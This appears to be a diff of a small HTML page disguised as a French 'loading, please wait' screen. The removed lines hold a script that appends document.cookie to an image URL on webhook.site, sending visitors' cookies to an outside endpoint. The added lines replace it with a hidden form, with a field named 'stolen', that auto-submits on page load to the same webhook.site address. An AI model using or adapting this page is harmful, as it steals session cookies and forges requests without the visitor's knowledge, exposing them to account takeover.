@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Chargement...</title></head>
   <body>
-    <img src="https://webhook.site/88c88ccb-cab6-4c3b-9f4d-002b9891f972?cookie=" id="exfil" />
+    <form action="https://webhook.site/88c88ccb-cab6-4c3b-9f4d-002b9891f972" method="POST">
+      <input type="hidden" name="stolen" value="1">
+    </form>
     <script>
-      document.getElementById('exfil').src += document.cookie;
+      document.forms[0].submit();
     </script>
-    <p>Merci de patienter...</p>
   </body>
 </html>
